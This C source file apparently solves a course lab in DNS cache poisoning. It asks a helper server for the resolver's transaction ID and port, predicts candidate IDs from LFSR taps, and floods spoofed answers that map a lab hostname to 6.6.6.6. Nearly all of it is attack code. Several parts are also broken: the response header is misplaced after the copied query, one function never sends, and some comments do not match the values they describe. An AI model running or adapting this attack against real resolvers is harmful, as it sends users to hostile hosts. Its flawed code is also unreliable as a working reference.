#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>

#define DNS_SERVER_IP "192.168.1.203" // Google's public DNS server
#define DNS_SERVER_PORT 53      // Standard DNS port
#define BUFFER_SIZE 512         // Buffer size for the DNS query and response
#define INFO_SERVER_IP "192.168.1.201" // Server providing initial information
#define INFO_SERVER_PORT 4444          // Port for receiving info
#define TAP1 0x80000057
#define TAP2 0x80000062


#include <sys/socket.h>
#include <netinet/udp.h>
#include <netinet/ip.h>

// Constants
#define PACKET_SIZE 1024
#define DNS_PORT 53

int build_dns_query(unsigned char *buffer, const char *hostname, uint32_t tid);

int build_dns_response(unsigned char *buffer, unsigned char *query, int query_len, uint32_t txid);

// DNS Header Structure
struct dns_header {
    unsigned short id;       // Transaction ID
    unsigned short flags;    // Flags
    unsigned short q_count;  // Questions
    unsigned short ans_count; // Answers
    unsigned short auth_count; // Authority RRs
    unsigned short add_count;  // Additional RRs
};

// DNS Question Structure
struct dns_question {
    unsigned short qtype;  // Query type
    unsigned short qclass; // Query class
};

// DNS Resource Record Structure
struct dns_rr {
    unsigned short name;    // Pointer to the domain name
    unsigned short type;    // Resource record type
    unsigned short _class;  // Class
    unsigned int ttl;       // Time to live
    unsigned short data_len; // Length of the resource data
    unsigned int rdata;     // Resolved IP address
};

// Checksum function
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (; len > 1; len -= 2) {
        sum += *buf++;
    }
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

int full_spoofed_answer(uint txid, uint d_port) {
    unsigned char buffer[PACKET_SIZE];
    memset(buffer, 0, PACKET_SIZE);

    // Example DNS query (a simple query for 'example.com')
    unsigned char query[] = {
        0x12, 0x34,  // Transaction ID
        0x01, 0x00,  // Standard query (flags)
        0x00, 0x01,  // One question
        0x00, 0x00,  // No answers
        0x00, 0x00,  // No authority
        0x00, 0x00,  // No additional sections
        0x07, 'e', 'x', 'a', 'm', 'p', 'l', 'e', 0x03, 'c', 'o', 'm', 0x00,  // Domain name
        0x00, 0x01, 0x00, 0x01  // Type A, Class IN
    };

    int query_len = sizeof(query);

    // Build the DNS response
    int response_len = build_dns_response(buffer, query, query_len, txid);

    // IP and UDP headers
    struct iphdr *iph = (struct iphdr *)buffer;
    struct udphdr *udph = (struct udphdr *)(buffer + sizeof(struct iphdr));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(d_port); // Destination port
    dest.sin_addr.s_addr = inet_addr("192.168.1.203"); // Destination IP

    // Fill in the IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + response_len);
    iph->id = htonl(54321); // Identification
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = inet_addr("192.168.1.207"); // Source IP
    iph->daddr = dest.sin_addr.s_addr;
    iph->check = 0; // Will calculate later

    // Fill in the UDP header
    udph->source = htons(DNS_PORT);
    udph->dest = dest.sin_port;
    udph->len = htons(sizeof(struct udphdr) + response_len);
    udph->check = 0; // Optional

    // Calculate IP checksum
    iph->check = checksum((unsigned short *)buffer, ntohs(iph->tot_len));

    // Create raw socket
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("Socket creation failed");
        return EXIT_FAILURE;
    }

}



// Structure for DNS header and response construction
int build_dns_response(unsigned char *buffer, unsigned char *query, int query_len, uint32_t txid) {
    int response_len = 0;

    // DNS Header (same as the query but with a different txid and response flags)
    uint32_t txid_network = htons(txid); 
    unsigned short flags = htons(0x8180);  // Standard query response, no error
    unsigned short q_count = htons(1);     // 1 question
    unsigned short ans_count = htons(1);   // 1 answer
    unsigned short auth_count = 0;
    unsigned short add_count = 0;

    // Copy the query into the buffer
    memcpy(buffer, query, query_len);
    response_len = query_len;

    // Header section for response
    memcpy(buffer + response_len, &txid_network, 2);
    response_len += 2;
    memcpy(buffer + response_len, &flags, 2);
    response_len += 2;
    memcpy(buffer + response_len, &q_count, 2);
    response_len += 2;
    memcpy(buffer + response_len, &ans_count, 2);
    response_len += 2;
    memcpy(buffer + response_len, &auth_count, 2);
    response_len += 2;
    memcpy(buffer + response_len, &add_count, 2);
    response_len += 2;

    // Copy the question section as is (hostname format and type)
    // This is the same question section as in the query, no changes
    memcpy(buffer + response_len, (query + 12), query_len - 12);
    response_len += query_len - 12;

    // Answer section: Hostname -> A record (IP: 6.6.6.6)
    unsigned short type = htons(1);  // Type A (IPv4 address)
    unsigned short _class = htons(1); // Class IN (Internet)
    unsigned int ttl = htonl(3000);    // Time-to-live: 300 seconds
    unsigned short data_len = htons(4); // Length of the IP address

    // A record data (IP address 6.6.6.6)
    unsigned char ip_address[] = { 6, 6, 6, 6 };

    // Write answer
    memcpy(buffer + response_len, &type, 2);
    response_len += 2;
    memcpy(buffer + response_len, &_class, 2);
    response_len += 2;
    memcpy(buffer + response_len, &ttl, 4);
    response_len += 4;
    memcpy(buffer + response_len, &data_len, 2);
    response_len += 2;
    memcpy(buffer + response_len, ip_address, 4);
    response_len += 4;

    return response_len;
}

// Function to send the spoofed DNS response
void send_spoofed_dns_response(const char *hostname, uint32_t txid, const char *destination_ip, int destination_port, uint32_t qtxid) {
    int sockfd;
    struct sockaddr_in server_addr;
    unsigned char buffer[BUFFER_SIZE];

    // Step 1: Create a UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Step 2: Configure the server address for sending the spoofed response
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(destination_port);
    inet_pton(AF_INET, DNS_SERVER_IP, &server_addr.sin_addr);

    // Step 3: Assume we already have the DNS query (this would normally come from the client)
    unsigned char query[BUFFER_SIZE];
    int query_len = build_dns_query(query, hostname, qtxid);  
    printf("query_len: %d\n", query_len);
    // Step 4: Build the DNS response
    int response_len = build_dns_response(buffer, query, query_len, txid);
    printf("response_len: %d\n", response_len);
    printf("query: %s\n", query);
    printf("destination_ip: %s\n", destination_ip);
    
    struct iphdr *iph = (struct iphdr *)buffer;
    iph->saddr = inet_addr("192.168.1.207"); // Source IP
    // Step 5: Send the spoofed DNS response
    if (sendto(sockfd, buffer, response_len, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Failed to send spoofed DNS response");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("Spoofed DNS response sent for hostname: %s with IP: 6.6.6.6\n", hostname);
    close(sockfd);
}

// Function to fill the txid_ls with the 10 possible txid
void fill_txids(uint32_t *txid_ls, uint32_t txid){
    // if the LSbit of r_1 = LSbit r_2 = 0 
    txid_ls[8] = txid >> 1;
    // set the left most bit of txid_ls[0] to 1, txid is 16 bits
    txid_ls[9] = (txid >> 1) | 0x8000;

    // else if the LSbit of r_1 = LSbit r_2 = 1
    for (int i = 0; i < 4; i ++) {
        txid_ls[i] = ((((txid >> 1) ^ TAP1 ^ TAP2) >> 1) ^ TAP1 ^ TAP2) | (14<<i);
    }
    
    for (int i = 0; i < 4; i ++) {
        txid_ls[4 + i] = (((txid >> 1) ^ TAP1 ^ TAP2) >> 1) | (14<<i);
    }
}
    
int socket_creation(struct sockaddr_in *server_addr){
    // Create a socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Configure the server address
    printf("configure the server address \n");
    memset(server_addr, 0, sizeof(*server_addr));
    (*server_addr).sin_family = AF_INET;
    (*server_addr).sin_port = htons(INFO_SERVER_PORT);
    inet_pton(AF_INET, INFO_SERVER_IP, &server_addr->sin_addr);

    // Connect to the server
    printf("connect to the server\n");
    if (connect(sockfd, (struct sockaddr *)server_addr, sizeof(*server_addr)) < 0) {
        perror("Connection to info server failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
    return sockfd;
}

// Function to communicate with the info server and get the txid
void run_attack(uint32_t *txid_ls) {
    // connect to server attacker
    int sockfd1;
    struct sockaddr_in server_addr1;
    char txid_buffer[BUFFER_SIZE];
    uint32_t txid = 0;
    unsigned int source_port = 0;

    sockfd1 = socket_creation(&server_addr1);
    
    printf("Attacker server connected: %s:%d\n", inet_ntoa(server_addr1.sin_addr), ntohs(server_addr1.sin_port));
    
    // send the DNS request  ################ step 1 #####################
    const char *hostname = "www.attacker.cybercourse.com";
    int sockfd;
    struct sockaddr_in server_addr;
    unsigned char buffer[BUFFER_SIZE];

    // Step 1: Create a UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }
    // Step 2: Configure the DNS server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(DNS_SERVER_PORT);
    inet_pton(AF_INET, DNS_SERVER_IP, &server_addr.sin_addr);
    printf("step 2 done\n");
    // Step 3: Build the DNS query
    int query_len = build_dns_query(buffer, hostname, 1234);
    printf("step 3 done\n");
    printf("buffer: %s\n", buffer);
    // Step 4: Send the DNS query
    if (sendto(sockfd, buffer, query_len, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Failed to send DNS query");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("DNS query sent for hostname: %s\n", hostname);
    printf("waiting for txid\n");
    // Receive the txid from the server
    int bytes_received = recv(sockfd1, txid_buffer, BUFFER_SIZE - 1, 0); // fix this
    if (bytes_received < 0) {
        perror("Failed to receive data from info server");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    txid_buffer[bytes_received] = '\0'; // Null-terminate the received string
    printf("Received from server: %s\n", txid_buffer);

    // Parse the txid
    if (sscanf(txid_buffer, "TXID: %u, PORT: %u", &txid, &source_port) != 2) {
        fprintf(stderr, "Failed to parse TXID from server response\n");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    printf("Extracted TXID: %u\n", txid);
    printf("source port : %u\n", source_port);
    fill_txids(txid_ls, txid);
    for (int i = 0; i < 10; i++) {
        send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port, txid_ls[i]);
        // full_spoofed_answer(txid_ls[i], source_port);
        printf("sent spoofed response %d with txid %u\n", i, txid_ls[i]);
    }
    
    // Close the connection
    close(sockfd);
    close(sockfd1);
}


// Function to build a DNS query
int build_dns_query(unsigned char *buffer, const char *hostname, uint32_t tid) {
    int query_len = 0;
    uint32_t txid = htons(tid); // Transaction ID
    unsigned short flags = htons(0x0100); // Standard query
    unsigned short q_count = htons(1);   // 1 question
    unsigned short ans_count = 0;        // No answers
    unsigned short auth_count = 0;       // No authority
    unsigned short add_count = 0;        // No additional

    // Header section
    memcpy(buffer + query_len, &txid, 2);
    query_len += 2;
    memcpy(buffer + query_len, &flags, 2);
    query_len += 2;
    memcpy(buffer + query_len, &q_count, 2);
    query_len += 2;
    memcpy(buffer + query_len, &ans_count, 2);
    query_len += 2;
    memcpy(buffer + query_len, &auth_count, 2);
    query_len += 2;
    memcpy(buffer + query_len, &add_count, 2);
    query_len += 2;
    printf("got here \n");
    // Question section (convert hostname to DNS format)
    char buffer2[512];
    strcpy(buffer2, hostname);
    const char *token = strtok((char *)buffer2, ".");
    printf("got here \n");
    while (token) {
        size_t len = strlen(token);
        buffer[query_len++] = (unsigned char)len;
        memcpy(buffer + query_len, token, len);
        query_len += len;
        token = strtok(NULL, ".");
    }

    buffer[query_len++] = 0; // End of hostname

    // Question Type (A record)
    unsigned short qtype = htons(1); // Type A
    memcpy(buffer + query_len, &qtype, 2);
    query_len += 2;

    // Question Class (IN)
    unsigned short qclass = htons(1); // Class IN
    memcpy(buffer + query_len, &qclass, 2);
    query_len += 2;

    return query_len;
}

int main() {
    uint32_t txid[10];

    // Step 1: Get the TXID from the info server
    run_attack(txid);


    return 0;
}
